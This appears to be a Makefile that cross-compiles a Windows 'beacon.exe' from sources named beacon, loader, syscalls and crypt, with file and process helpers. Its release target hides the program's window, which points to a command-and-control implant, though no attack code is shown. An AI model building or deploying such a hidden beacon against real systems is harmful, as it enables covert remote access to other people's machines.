# when compling the json stuffs:
# apt install autoconf automake libtool
# ./autogen.sh
# ./configure --host=x86_64-w64-mingw32 --disable-static --enable-shared LDFLAGS=-static
# make install

VARIABLES=

WIN_CC=/usr/bin/x86_64-w64-mingw32-gcc

WIN_LINK=-L../lib/json-c/.libs/ -L./ -ljson-c
WIN_HIDE_FLAGS=-Wl,-subsystem,windows
WIN_FLAGS=-Wl,-Bstatic -lwinhttp -Wl,-Bstatic -lwtsapi32 -Wl,-Bstatic -lsecur32 $(VARIABLES) --static -Wl,--pic-executable,-e,main -w

WIN_EXE_OUT=../beacon.exe

WIN_C_SOURCES=debug.c core.c beacon.c syscalls.c loader.c

WIN_STDLIB_DIR=../lib/stdlib/
WIN_STDLIB_SOURCES=$(WIN_STDLIB_DIR)listdirs.c $(WIN_STDLIB_DIR)readfile.c \
				   $(WIN_STDLIB_DIR)makedirectory.c $(WIN_STDLIB_DIR)removefile.c \
				   $(WIN_STDLIB_DIR)getdir.c $(WIN_STDLIB_DIR)changedir.c $(WIN_STDLIB_DIR)getpid.c \
				   $(WIN_STDLIB_DIR)getps.c
WIN_STDLIB_FLAGS=-static -shared -w
WIN_STDLIB_OUT=stdlib.lib

WIN_SECURE_DIR=../lib/secure/
WIN_SECURE_SOURCES=$(WIN_SECURE_DIR)main.c
WIN_STDLIB_FLAGS=-static

WIN_VITAL_SOURCES=base64.c crypt.c

x64_debug: win_beacon_64_debug
x64: win_beacon_64

win_stdlib_64:
	$(WIN_CC) -c $(WIN_STDLIB_SOURCES) $(WIN_STDLIB_FLAGS) $(WIN_STDLIB_FLAGS)

win_beacon_64_debug:
	$(WIN_CC) $(WIN_STDLIB_SOURCES) $(WIN_VITAL_SOURCES) $(WIN_SECURE_SOURCES) $(WIN_C_SOURCES) -o $(WIN_EXE_OUT) $(WIN_LINK) $(WIN_FLAGS) -DDEBUG_MODE

win_beacon_64:
	$(WIN_CC) $(WIN_STDLIB_SOURCES) $(WIN_VITAL_SOURCES) $(WIN_SECURE_SOURCES) $(WIN_C_SOURCES) -o $(WIN_EXE_OUT) $(WIN_LINK) $(WIN_FLAGS) $(WIN_HIDE_FLAGS)